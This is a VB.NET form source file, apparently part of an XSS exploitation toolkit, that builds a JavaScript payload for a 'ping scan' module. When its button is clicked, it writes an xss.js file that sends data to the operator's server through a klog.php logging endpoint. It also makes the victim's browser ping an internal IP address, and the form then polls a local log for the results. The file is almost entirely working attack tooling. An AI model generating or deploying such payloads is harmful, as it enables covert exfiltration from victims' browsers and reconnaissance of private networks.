Imports System.IO
Imports System.Threading


Public Class xss_info_pingscan

    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        On Error Resume Next
        Dim ran = New Random()
        Dim tmp = ran.Next(360, 400)

        IO.File.Delete("xss.js")
        IO.File.Delete("logs.txt")
        Dim stream As New IO.StreamWriter(Application.StartupPath & "\xss.js")
        stream.WriteLine(cd.Text)
        stream.WriteLine("new Image().src = 'http://" & xss_server.server_ip & "/klog.php?log='+x;")
        stream.WriteLine(code.Text)
        stream.WriteLine("if (document.getElementById('xenotix_png" & Str(tmp) & "') == null){ var png = new ping('" & ip.Text & "');png.doGet(); script = document.createElement('script');script.id = 'xenotix_png" & Str(tmp) & "'; document.body.appendChild(script); }")
        stream.Close()
        Button1.Enabled = False
        Timer1.Enabled = True


    End Sub

    Private Sub xss_info_pingscan_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        On Error Resume Next
        IO.File.Delete("xss.js")
        IO.File.Delete("logs.txt")
    End Sub

    Private Sub Button2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button2.Click
        On Error Resume Next
        IO.File.Delete("xss.js")
        IO.File.Delete("logs.txt")
        Me.Close()
    End Sub

    Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick
        On Error Resume Next

        Dim line As String = ""
        Dim readfile As System.IO.TextReader = New StreamReader(Application.StartupPath & "\logs.txt")
        line = readfile.ReadToEnd()
        If Not line = "" And line.Contains(ip.Text) Then
            Label2.Text = line
            Timer1.Enabled = False
        End If
        readfile.Close()
        readfile = Nothing


    End Sub
End Class